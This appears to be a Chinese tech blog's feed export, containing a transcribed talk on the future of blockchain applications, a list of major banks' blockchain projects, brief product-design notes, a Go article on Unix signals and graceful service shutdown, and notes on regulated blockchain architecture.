<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/1.JPG"></p>
<p>区块链的应用到底会怎样大爆发？这是我今天试图探讨的一个话题。思考区块链应用的方向或者爆发程度的时候，我自己从应用分层的角度理了一个框架。这个框架从上往下看就是从互联网到区块链，从下往上看则是从区块链到互联网。从分布式网络、分布式数据库、分布式计算到分布式账本。分布式账本是互联网已经有的东西。当然有了区块链以后，分布式存储和分布式计算，和互联网概念里面的分布式存储和计算已经不一样了。一方面它是分布式，同时比分布式更加去中心化。比如Dfinity号称的互联网计算机，它为什么说是互联网计算机，而不是区块链计算机呢？因为就分布式计算来说，确实里面很大一块内容是互联网范畴里面的东西，而不是纯粹的区块链上的东西。溯源和存证虽是区块链应用，但其实里面还包含了互联网技术的成分。分布式账本是一个分界线，越过分布式账本再往下走、往深走，越来越区块链化，用到的更多是区块链的技术。</p>
<p>到了分布式治理尤其如此。不管是分布式治理涉及到的经济模型还是共识算法用到的都是区块链技术。因为要用社区治理机制的话，需要设计一个很好的共识算法。分布式治理之下，再往深处走就是分布式应用。分布式应用再往下走，就成了加密经济体。一个完整的分布式商业世界，就这么搭建出来了。</p>
<p>不是说到了分布式商业才有区块链应用，每个层次都有区块链的某个应用，只是有些应用和互联网产生的交集大，有些应用更像一个纯粹的区块链应用。这是我从应用角度做的分层。把互联网的技术、区块链的技术打碎了，放到这样几个层次看。不完全拘泥于技术的先后或者分层，对于我们思考区块链的终极应用会有新帮助。</p>
<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/2.JPG"></p>
<p>从有计算机或信息技术以来，可以看到在应用方面，这些技术的应用经历了三个阶段。第一个阶段是纯粹的信息化技术时期。上世纪70、80、90年代，那时候信息技术支撑着一些商业应用。大家用的软件系统可能有十万、几十万甚至上百万行代码。第二个阶段是互联网平台时期。互联网平台把很多复杂的软件下沉为基础设施。第三阶段是区块链时期。区块链进一步把互联网平台下沉为基础设施。研究整个信息技术和数字技术的应用，就会发现过去几十年间，我们不断把应用层下沉为基础设施，然后为应用层带来新变化。区块链带来的下沉最后产生了分布式应用。</p>
<p>有人说金融已经完全场景化了。有一句著名的话：“银行服务到处都在，就是不在银行。”但为什么金融会场景化？金融服务都变成根据具体场景提供？从基础设施的角度看，其实是金融服务被下沉为了基础设施。金融服务本身是很好的商业应用，随着技术的发展，逐渐变成基础设施。以第三方支付为例，它原来是个利润丰厚的行业，大家在追捧，结果却发现它赚不到钱。第三方支付最能为谁所用呢？答案是互联网公司。因为第三方支付对于社交、电商、外卖、共享单车等互联网公司来说已经成为了免费的行业公共基础设施。由此我们可以看到，互联网行业里原来非常显赫的应用层也在逐渐下沉为基础设施。</p>
<p>区块链是这种下沉的集大成者。这一点我稍后具体阐述。从软件系统、互联网平台到区块链，这种下沉的过程中，软件系统在设计之初使用起来其实非常复杂。比如在没有浏览器的时代要用命令行去运行Windows操作系统里的各种软件。但又有多少人会用命令行呢？所以最初的Window系统是一个非常难学习、难普及的信息技术应用。</p>
<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/3.JPG"></p>
<p>到了互联网平台，这些复杂的软件系统通通下沉了。互联网平台以APP的方式，提供了非常轻、非常简单、非常容易操作的应用，比如微信。微信这样的应用背后虽然是一个庞大的软件系统，需要几十万行代码支撑，但对用户来说，就只是一个操作简便的APP。大爷大妈也能用它发红包，甚至抢红包的速度比年轻人还快。</p>
<p>到了区块链时代，APP还将继续下沉。区块链时代使用的是智能合约。它就像一个小程序，比APP更简单。一个APP要用到几万行代码，但一个智能合约可能只要几百行、几千行代码就能形成一个应用。</p>
<p>另外，互联网平台是需求端驱动的，即消费者驱动网络的运行。到了区块链时代不再是消费者驱动了，而是由开发者驱动，因为区块链是一个对开发者友好的网络。目前发展最好的区块链系统都是由开发者社区建设的。任何没有开发者社区的区块链系统，一定没有生命力。</p>
<p>但区块链时代为什么不是C端驱动的呢？正如今天上午V神提出的：区块链为什么没有杀手级应用？因为它是个杀手级网络。它是由开发者驱动的网络，由供应端驱动网络发展，最后达到消费端。由此可见，区块链与互联网截然不同，在区块链上创业和在互联网上创业也非常不一样。</p>
<p>下面我将通过两个案例解释什么是区块链应用的终极模式。第一个案例是今天好多演讲嘉宾都谈及的Uniswap。两个年轻人通过500行代码取代了一个需要十万或者几十万代码或者几十万行代码支撑的中心化系统。这个案例说明什么呢？它非常有预示性和预见性。让我们看到基于区块链的应用绝对不能通过5万、10万行代码来完成一件事。智能合约不能是5万、10万行代码组成的，只能有几百、几千行代码。Uniswap虽然有缺陷，但只要几百、几千行代码就能超越几万行代码支撑、上千人来运营的系统。这样一个成功的案例可能预示着基于区块链的应用应该有以下几个特点：</p>
<p>第一，通过智能合约来提供应用，而所有的智能合约就只需要几千、几万行代码。Uniswap之所以通过几百、几千行代码就能取代这么一个中心化系统，是因为区块链在集成各种技术，下沉成为基础设施方面做得最为彻底。前面我讲的分布式网络、分布式数据库、分布式存储、分布式计算、分布式账本、分布式治理都成为了免费的基础设施。比如公链，无须许可，也不需要开发成本，大大降低了年轻人的成本。我们也没听说Uniswap去融资。反倒是它成功以后，资本开始倒追它。但在互联网时代，你能说不需要资本就能创业吗？互联网时代的任何一个应用，不要说让互联网巨头搭载在你上面，就算是你搭载在它上面，它对你都会有很多审核和许可流程。但在公链上就没有这些审核和许可流程。</p>
<p>我看到一个demo，就是Dfinity，用1000行代码写了一个去中心化的TikTok，当然它还只是一个demo。期待Dfinity主网真正上线以后，看到一个用1000代码写出一个把TikTok取代的去中心化应用。如果这件事情能成真，就坚定了我对区块链应用模式的终极猜想：基于区块链的应用就是只需要几百、几千行代码的智能合约。</p>
<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/4.JPG"></p>
<p>这两个案例很有预示性，也许这就是区块链应用发展方向。区块链成为应用的基础设施，集成存储、计算、激励、账本、身份、账户、地址等多种功能，形成具有以下特点的商业基础设施：</p>
<p>　　特点一：必须开源。如果不是开源，就不可能成为受人信任的基础设施。</p>
<p>　　特点二：必须开放。也就是无须许可，创业者不需要得到任何人的认可，就可以做自己的事情。</p>
<p>　　特点三：共享共治的治理机制及共享的利益分配。从Shareholder变成Stakeholder，这就是区块链带来的变化。利益相关的资本主义，是一个共享的资本主义机制，而不是中心化的资本主义机制。同时它应该是分布式、去中心化、自组织的。虽然区块链是公共基础设施，但已经没有物理公共基础设施所天然带来的弊端，即“公地悲剧”。</p>
<p>我个人非常期待随着今年整体架构搭建完成之后，区块链这样一个基础设施在未来两、三年能持续优化，优化到能够承接大规模的杀手级应用。这样的运行意味着什么呢？它意味着任何一个懂代码的人都可以在这个平台上低门槛、低代码、低资本、低运营、自由地部署自己的应用。这个应用可能只有1000行、500行代码。这个应用变成了什么？变成了高可信、高可靠、高安全、高收益、高分散的应用。这样的应用是互联网世界无法带来的，只有区块链世界才可能带来的。</p>
<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/5.JPG"></p>
<p>大家设想一下，在这样一个自由发布应用的基础设施上，中国1000万个创业者可以自由创业。我相信涌现出来的伟大应用一定比在原来高门槛、高代码、高资本投入、高运营的互联网时代多得多。在那个互联网平台上，全中国只有20万人有创业的资格，因为当时创业要具备很多条件。要找到资金、人力、成立公司，为应用找流量平台、运营流量。存储、计算、信任等等都问题都需要自己解决。但在区块链上，这些统统都是免费、自由的公共基础设施，从而降低了创业门槛，让有资格创业的人从20万变成了1000万。1000万人里面出现伟大应用的机会，肯定比20万人要大得多。</p>
<p>　　综上所述，互联网的应用解放了消费者，区块链的应用解放了开发者，解放开发者就是解放创业者。所以只有基于区块链才可能实现“大众创业、万众创新”。区块链是适合 “大众创业、万众创新”的最好平台，谢谢大家！</p>
<p>====================== 以下是本人的分析 ======================</p>
<p><img src="/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/6.JPG"></p>
]]></content>
  </entry>
  <entry>
    <title>区块链在银行业的落地情况</title>
    <url>/2024/08/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9C%A8%E9%93%B6%E8%A1%8C%E4%B8%9A%E7%9A%84%E8%90%BD%E5%9C%B0%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<p><strong>1. 摩根大通（JPMorgan Chase）</strong><br>• <strong>项目名称</strong>: Liink by J.P. Morgan (原名为Interbank Information Network, IIN)<br>• <strong>业务金额</strong>: 摩根大通通过Liink的Confirm应用来改进全球资金转账，并降低交易被退回的概率。通过Liink进行的全球支付涉及超过9500000笔交易。此平台目前有90多家金融机构参与，覆盖20多个国家。<br>• <strong>启动时间</strong>: 2019年以后，Liink在继续扩展和优化功能。<br>• <strong>技术实现</strong>: Liink是由摩根大通的Onyx部门开发的一个分布式账本平台，最初称为Interbank Information Network (IIN)。该平台利用区块链技术来提高全球银行间支付的透明度和效率。Liink的技术架构基于<a href="https://github.com/Consensys/quorum">Quorum，这是一种许可链</a>，旨在确保高效、安全的交易处理。<br>• <strong>相关资料</strong>: <a href="https://www.jpmorgan.com/onyx/liink">J.P. Morgan Liink</a></p>
<p><strong>2. 汇丰银行（HSBC）</strong><br>• <strong>项目名称</strong>: Contour (原名为Voltron)<br>• <strong>业务金额</strong>: Contour是一个基于区块链的贸易融资平台，旨在简化和加速全球贸易流程。目前，该平台处理的业务金额已超过1亿美元，主要涉及信用证（Letter of Credit）的数字化交易。超过20家银行，包括恒生，中国银行（香港），花旗银行，工商银行，ING，渣打银行，DBS，等等。<br>• <strong>启动时间</strong>: 2019年正式推出，并且仍在全球范围内扩展。汇丰银行是 Contour 平台的创始成员之一，并且在推动平台的设计、开发和推广方面发挥了重要作用。<br>• <strong>技术实现</strong>: Contour（前称为Voltron）使用R3的<a href="https://corda.net/">Corda区块链</a>平台来实现贸易融资数字化。Corda是一个专为金融服务设计的分布式账本技术，允许企业通过智能合约来自动化贸易融资流程，并确保交易的安全性和透明性。<br>• <strong>相关资料</strong>: <a href="https://www.contour.network/network-coverage/#partners">Contour partners</a> </p>
<p><strong>3. 瑞银集团（UBS）</strong><br>• <strong>项目名称</strong>: Utility Settlement Coin (USC)<br>• <strong>业务金额</strong>: USC项目涉及数亿美元的结算交易，由瑞银牵头，参与银行包括巴克莱、德意志银行、汇丰银行等。该项目致力于利用区块链技术进行金融市场的数字化结算。但没有具体的金额披露。<br>• <strong>启动时间</strong>: 2019年继续扩展并成立了Fnality International公司来推动项目的商业化。<br>• <strong>技术实现</strong>: USC项目由多家全球银行联合开发，使用了基于区块链的分布式账本技术，旨在创建一种数字货币用于金融市场的结算。该项目后来成立了Fnality International公司，进一步推动了该技术的实际应用。USC具体基于哪一种区块链技术，目前没有公开，但是可以看到<a href="%5Bhttps://entethalliance.org/%5D(https://entethalliance.org/)">Ethereum Enterprise Alliance (EEA) </a>是Utility Settlement Coin (USC)的活跃成员之一。<br>• <strong>相关资料</strong>: <a href="https://www.fnality.org/">Fnality International</a></p>
<p><strong>4. 花旗集团（Citigroup）</strong><br>• <strong>项目名称</strong>: SETL<br>• <strong>业务金额</strong>: Citigroup通过投资SETL平台，支持数亿美元的现金和其他资产的区块链结算。SETL旨在现代化资本市场基础设施，确保高效、安全的资产转移。但没有具体的金额披露。<br>• <strong>启动时间</strong>: 2019年起，Citigroup持续支持SETL的发展。<br>• <strong>技术实现</strong>: SETL平台旨在通过区块链技术来现代化资本市场基础设施。它允许资产（如现金、证券等）的安全、高效转移。SETL具体基于哪一种区块链技术，目前没有公开。<br>• <strong>相关资料</strong>: <a href="https://www.setl.io/">SETL</a></p>
<p><strong>5. ING银行（ING）</strong><br>• <strong>项目名称</strong>: HQLAx<br>• <strong>业务金额</strong>: HQLAx平台旨在优化证券借贷市场，参与的市场规模达到数十亿美元，主要涉及银行间的高质量流动性资产（HQLA）借贷交易。<br>• <strong>启动时间</strong>: 2018年<br>• <strong>技术实现</strong>: HQLAx基于R3的Corda平台开发，该平台虽然是许可链，但项目与公有链有紧密关联。HQLAx通过区块链技术改善了市场的流动性和透明度。<br>• <strong>相关资料</strong>: <a href="https://www.hqla-x.com/">HQLAx Overview</a> ， <a href="https://corda.net/modal/hqlax/">https://corda.net/modal/hqlax/</a></p>
<p><strong>6. 渣打银行（Standard Chartered）</strong><br>• <strong>项目名称</strong>: Zodia Custody<br>• <strong>业务金额</strong>: Zodia Custody服务于大型金融机构，如渣打银行和Northern Trust，提供安全的加密资产托管。<br>• <strong>启动时间</strong>: 2020年<br>• <strong>技术实现</strong>: 采用多重签名和冷存储技术，确保符合主要金融监管要求，保障数字资产的安全存储。<br>• <strong>相关资料</strong>: <a href="https://www.zodia.io/">Zodia Custody Overview</a></p>
<p>• <strong>项目名称</strong>: Partior<br>• <strong>业务金额</strong>: Partior为渣打银行、新加坡银行等金融机构提供跨境支付结算服务。<br>• <strong>启动时间</strong>: 2021年<br>• <strong>技术实现</strong>: 基于区块链技术，支持实时跨境支付结算，降低交易对手风险，并减少结算时间。<br>• <strong>相关资料</strong>: <a href="https://www.partior.com/">Partior Overview</a></p>
<p>• <strong>项目名称</strong>: Olea<br>• <strong>业务金额</strong>: Olea为渣打银行和汇丰银行等大客户提供供应链金融服务，帮助企业管理和融资供应链。<br>• <strong>启动时间</strong>: 2021年<br>• <strong>技术实现</strong>: 利用区块链技术创建透明且可追踪的供应链融资流程，减少企业融资的时间和成本。<br>• <strong>相关资料</strong>: <a href="https://www.olea.net/">Olea Overview</a></p>
<p><strong>7. 西班牙对外银行（BBVA）</strong><br>• <strong>项目名称</strong>: BBVA Corporate Loans on Blockchain<br>• <strong>业务金额</strong>: 西班牙对外银行利用区块链平台进行了数十亿美元的企业贷款结算。<br>• <strong>启动时间</strong>: 2018年<br>• <strong>技术实现</strong>: 该项目使用了基于以太坊（Ethereum）的公有链技术来记录和结算企业贷款，使交易透明化并降低操作风险。<br>• <strong>相关资料</strong>: <a href="https://www.bbva.com/en/innovation/bbva-signs-world-first-blockchain-based-syndicated-loan-arrangement-with-red-electrica-corporacion/">BBVA Blockchain Projects</a></p>
<p> <strong>8. 法国农业信贷银行（Crédit Agricole）</strong><br>• <strong>项目名称</strong>: Tokenization of Bonds on Blockchain<br>• <strong>业务金额</strong>: 法国农业信贷银行的意大利分行与金融科技初创公司BlockInvest合作，正在推动债券代币化项目。该项目特别关注中小企业（SMEs）的债券发行，这也是意大利央行探索分布式账本技术（DLT）的一部分。<br>• <strong>启动时间</strong>: 自2021年以来，该项目一直在发展，最近在2023年进行了扩展，重点是平台的扩展和新监管要求的整合，包括未来可能引入的加密欧元。<br>• <strong>技术实现</strong>: 该项目使用了以太坊（Ethereum）和Polygon公有区块链平台，以提供一个安全透明的环境来进行债券发行。项目旨在提高债券交易的效率，增加市场的流动性和可访问性。未来，项目计划集成自动交割对付（DvP）和链上身份解决方案，以确保合规性和提高运营效率。<br>• <strong>相关资料</strong>: <a href="https://sebgroup.com/press/news/2023/seb-and-credit-agricole-cib-launch-digital-bond-platform-built-on-blockchain-technology">SEB and Crédit Agricole CIB launch digital bond platform built on blockchain technology</a>，<a href="https://www.ledgerinsights.com/credit-agricole-italy-bond-tokenization/">https://www.ledgerinsights.com/credit-agricole-italy-bond-tokenization/</a></p>
<p><strong>9. 富达投资（Fidelity Investments）</strong><br>• <strong>项目名称</strong>: Fidelity Digital Assets<br>• <strong>业务金额</strong>: 未披露具体金额，但富达投资的数字资产业务管理着大量的加密货币，包括比特币和以太坊，服务于全球的机构投资者。<br>• <strong>启动时间</strong>: 2018年启动，是传统金融机构中较早涉足数字资产托管领域的公司之一。<br>• <strong>技术实现</strong>: 富达的数字资产平台通过定制化的冷存储和热存储解决方案，提供高度安全的数字资产托管服务。平台采用了多重签名技术和先进的安全协议，确保资产的安全性和符合监管要求。此外，富达还提供交易执行、市场接入和其他增值服务，以帮助客户在数字资产市场中进行投资。<br>• <strong>相关资料</strong>: <a href="https://www.fidelitydigitalassets.com/">Fidelity Digital Assets</a> <a href="https://www.theblock.co/post/67146/fidelity-backed-crypto-security-startup-fireblocks-launches-secure-asset-transfer-network">Fidelity-backed crypto security startup Fireblocks launches ‘Secure Asset Transfer Network’</a></p>
<p><strong>10. 德意志银行（Deutsche Bank）</strong><br>• <strong>项目名称</strong>: Digital Asset Custody Platform<br>• <strong>业务金额</strong>: 具体金额未披露，但该平台旨在为机构客户提供广泛的数字资产托管服务，包括比特币和以太坊等主要加密货币。德意志银行已经为此申请了监管许可，显示其在这一领域的重大投入  。<br>• <strong>启动时间</strong>: 项目于2021年启动，并在2023年加速推进。<br>• <strong>技术实现</strong>: 平台结合了传统银行系统和数字资产生态系统，提供机构级别的冷存储和热存储解决方案，确保资产的安全性和合规性。<br>• <strong>相关资料</strong>: <a href="https://www.coindesk.com/business/2021/02/13/deutsche-bank-quietly-plans-to-offer-crypto-custody-prime-brokerage/">CoinDesk</a>, <a href="https://dailyhodl.com/2021/02/14/deutsche-bank-preparing-to-support-crypto-assets-providing-prime-brokerage-and-storage-for-clients/">Daily Hodl</a></p>
<p><strong>11. 法国巴黎银行（BNP Paribas）</strong><br>• <strong>项目名称</strong>: BNP Paribas Securities Services’ Digital Asset Custody<br>• <strong>业务金额</strong>: 未披露具体金额，但该平台旨在为机构客户提供安全且合规的数字资产托管服务。<br>• <strong>启动时间</strong>: 2022年启动，目前正在积极扩展服务以满足市场需求。<br>• <strong>技术实现</strong>: 法国巴黎银行与两大金融科技公司Fireblocks和METACO合作，开发了这一数字资产托管平台。Fireblocks提供热钱包、代币化和连接基础设施层，METACO则提供银行级别的数字资产托管和编排平台。平台集成了区块链技术，旨在为客户提供安全且高效的数字资产发行、转移和托管服务。<br>• <strong>相关资料</strong>: <a href="https://securities.cib.bnpparibas/bnp-paribas-securities-services-to-develop-digital-assets-custody-capabilities-through-partnerships-with-metaco-and-fireblocks/">BNP Paribas Securities Services to develop digital assets custody capabilities through partnerships with METACO and Fireblocks</a></p>
<p><strong>12. 瑞银集团（UBS）</strong><br>• <strong>项目名称</strong>: UBS Digital Asset Custody<br>• <strong>业务金额</strong>: 未披露具体金额，但主要为高净值客户和机构投资者提供服务。<br>• <strong>启动时间</strong>: 2021年启动，逐步扩展数字资产管理服务。<br>• <strong>技术实现</strong>: 该平台采用区块链技术，提供全面的数字资产管理和托管服务，确保高效且安全的资产交易。<br>• <strong>相关资料</strong>: <a href="https://www.ubs.com/global/en/investment-bank/tokenize.html">UBS Tokenize</a></p>
<p><strong>13. 高盛（Goldman Sachs）</strong><br>• <strong>项目名称</strong>: Goldman Sachs Digital Asset Custody<br>• <strong>业务金额</strong>: 未披露具体金额，但高盛的数字资产托管服务预计涉及数十亿美元的资产管理。<br>• <strong>启动时间</strong>: 2021年启动，并逐步扩展以涵盖更多类型的数字资产。<br>• <strong>技术实现</strong>: 平台整合了冷存储和热存储解决方案，确保符合机构投资者的安全性和合规性要求。<br>• <strong>相关资料</strong>: <a href="https://developer.gs.com/discover/gs-dap">Goldman Sachs/discover/gs-dap</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
        <tag>BANK</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链应用落地的产品设计</title>
    <url>/2019/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E8%90%BD%E5%9C%B0%E7%9A%84%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p>产品从0到1的原则：</p>
<ul>
<li><p>MVP 最小化可用产品</p>
<p>以旅游产品为例，可以考虑 hotel 客房预订作为 MVP，而不是选择这个旅行安排作为第一步。</p>
</li>
<li><p>以目标用户为本，而不是所有人</p>
<p>为目标用户的需求而设计，为解决需求的同事提供更高的价值。</p>
<p>核心需求—&gt; 体验需求—&gt;更高价值(使用价值、情感价值、尊重价值、自我实现价值)</p>
<p>以 hotel 客房预订为例，目标用户为商务旅行的人员？个人度假的人员？</p>
<p>商务人员的核心需求是hotel城市分布广泛，梯度价位适度。</p>
<p>个人度假的核心需求是 hotel 的性价比。</p>
</li>
<li><p>综上，以中小型公司商务人员和个人用户针对Hotel客房预订的核心需求是性价比。</p>
</li>
</ul>
<p>Hotel 客房预订的产品 MVP 的最主要需求是实时性，可靠性，正确性和容易地得到价格(曲线)</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>关于golang服务重启</title>
    <url>/2020/03/30/%E5%85%B3%E4%BA%8Egolang%E6%9C%8D%E5%8A%A1%E9%87%8D%E5%90%AF/</url>
    <content><![CDATA[<p>我相信每个人都会想，每次更新完代码，更新完配置文件后，就直接这么 <code>ctrl+c</code> 真的没问题吗，<code>ctrl+c</code>到底做了些什么事情呢？</p>
<p>本文我们讨论 <code>ctrl+c</code> 背后的<strong>信号</strong>以及如何<strong>优雅的重启服务</strong>，以及对 <code>HTTP</code> 服务进行热更新。</p>
<h3 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl + c"></a>ctrl + c</h3><p>在终端执行特定的组合键可以使系统发送特定的信号给此进程，完成一系列的动作</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>信号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ctrl + c</td>
<td>SIGINT</td>
<td>强制进程结束</td>
</tr>
<tr>
<td>ctrl + z</td>
<td>SIGTSTP</td>
<td>任务中断，进程挂起</td>
</tr>
<tr>
<td>ctrl + \</td>
<td>SIGQUIT</td>
<td>进程结束 和 <code>dump core</code></td>
</tr>
<tr>
<td>ctrl + d</td>
<td></td>
<td>EOF</td>
</tr>
<tr>
<td>常用于重启、重新加载进程</td>
<td>SIGHUP</td>
<td>若程序中没有捕捉该信号，当收到该信号时，进程就会退出</td>
</tr>
<tr>
<td></td>
<td>SIGPIPE</td>
<td>在进程往一个已经关闭的管道写数据时会产生</td>
</tr>
</tbody></table>
<p>因此在我们执行<code>ctrl + c</code>关闭服务端时，<strong>会强制进程结束，导致正在访问的用户等出现问题</strong>。</p>
<p>常见的 <code>kill -9 pid</code> 会发送 <code>SIGKILL</code> 信号给进程，也是类似的结果。</p>
<h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>本段中出现<strong>信号</strong>是什么呢？</p>
<p>信号是 <code>Unix</code> 、类 <code>Unix</code> 以及其他 <code>POSIX</code> 兼容的操作系统中进程间通讯的一种有限制的方式。</p>
<p>它是一种异步的通知机制，用来提醒进程一个事件（硬件异常、程序执行异常、外部发出信号）已经发生。当一个信号发送给一个进程，操作系统中断了进程正常的控制流程。此时，任何非原子操作都将被中断。如果进程定义了信号的处理函数，那么它将被执行，否则就执行默认的处理函数。</p>
<h4 id="所有信号"><a href="#所有信号" class="headerlink" title="所有信号"></a>所有信号</h4><p>从go语言 go root SDK中 <code>zerrors_linux_amd64.go</code> 来看，关于信号有如下常量：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">SIGABRT   </span><br><span class="line">SIGALRM   </span><br><span class="line">SIGBUS    </span><br><span class="line">SIGCHLD   </span><br><span class="line">SIGCLD    </span><br><span class="line">SIGCONT   </span><br><span class="line">SIGFPE    </span><br><span class="line">SIGHUP    </span><br><span class="line">SIGILL    </span><br><span class="line">SIGINT    </span><br><span class="line">SIGIO     </span><br><span class="line">SIGIOT    </span><br><span class="line">SIGKILL   </span><br><span class="line">SIGPIPE   </span><br><span class="line">SIGPOLL   </span><br><span class="line">SIGPROF   </span><br><span class="line">SIGPWR    </span><br><span class="line">SIGQUIT   </span><br><span class="line">SIGSEGV   </span><br><span class="line">SIGSTKFLT </span><br><span class="line">SIGSTOP   </span><br><span class="line">SIGSYS    </span><br><span class="line">SIGTERM   </span><br><span class="line">SIGTRAP   </span><br><span class="line">SIGTSTP   </span><br><span class="line">SIGTTIN   </span><br><span class="line">SIGTTOU   </span><br><span class="line">SIGUNUSED </span><br><span class="line">SIGURG    </span><br><span class="line">SIGUSR1   </span><br><span class="line">SIGUSR2   </span><br><span class="line">SIGVTALRM </span><br><span class="line">SIGWINCH  </span><br><span class="line">SIGXCPU   </span><br><span class="line">SIGXFSZ   </span><br></pre></td></tr></table></figure>

<h3 id="怎样算优雅"><a href="#怎样算优雅" class="headerlink" title="怎样算优雅"></a>怎样算优雅</h3><h4 id="优雅地退出"><a href="#优雅地退出" class="headerlink" title="优雅地退出"></a>优雅地退出</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TrapSignal catches the SIGTERM/SIGINT/SIGKILL and executes cb function. </span></span><br><span class="line"><span class="comment">// After that it exits with code 0.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TrapSignal</span><span class="params">(cb <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">	c := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM, syscall.SIGKILL)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> sig := <span class="keyword">range</span> c &#123;</span><br><span class="line">			fmt.Sprintf(<span class="string">&quot;captured %v, exiting...&quot;</span>, sig)</span><br><span class="line">			<span class="keyword">if</span> cb != <span class="literal">nil</span> &#123;</span><br><span class="line">				cb()</span><br><span class="line">			&#125;</span><br><span class="line">			os.Exit(<span class="number">0</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在接收退出信号<code>SIGTERM/SIGINT/SIGKILL</code>之后，系统退出<code>os.Exit(0)</code>之前，执行cb() callback函数。具体执行方法建议如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Cmd</span><span class="params">(ctx *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// program of business logic</span></span><br><span class="line">    start()</span><br><span class="line">    </span><br><span class="line">    TrapSignal(logger, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// program of business exit here</span></span><br><span class="line">		stop()</span><br><span class="line">	&#125;)</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="gin退出"><a href="#gin退出" class="headerlink" title="gin退出"></a>gin退出</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	engine := gin.Default()</span><br><span class="line">	engine.GET(<span class="string">&quot;/ping&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	TrapSignal(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;before exit.&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	engine.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链架构分析</title>
    <url>/2022/08/04/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>区块链架构分类：</p>
<p>1） “小飞象” Dumbo 模型</p>
<p>目前的区块链是构建在互链网之上，安全，身份，都必须由区块链自身来完成，区块链更像是互联网的一个应用，就像一个小飞象，可以飞，但是体重太重。这样的模型以后必定会有大风险，会出问题，就像将高楼建立在沙滩上，风来了，雨来了，必将倾倒。</p>
<p>账户存储在应用层，而不是存储在操作系统底层。央行为了监管比特币和以太坊，需要获得全部交易数据，才能达到国家监管的要求。所以，针对多个国家部署、构成全球网络的区块链，监管机制不应该放在应用层，监管机制需要放入核心层，才能够达到监管的目的。“小飞象”模型这样子的设计，监管机制很可能不能到位。</p>
<p>2）“操作数据库系统”Operation Database System</p>
<p>对所有交易进行监管，所有账户和交易信息任务需要在系统内执行，而且部分任务由硬件处理，保护隐私，增加处理速度。区块链是一个分布式数据系统，这样子的操作系统就可能成为“操作数据库系统”，不再只是操作系统。这是“可监管操作系统”的设计原则。</p>
<p>如上，操作系统具有两个主要进程 — 交易进程（transaction process）和监管进程（regulation process）。同时，操作系统负责追踪交易数据，交易多方各自保证各自的信息真实。如果出错，出错方需要为损失负责。</p>
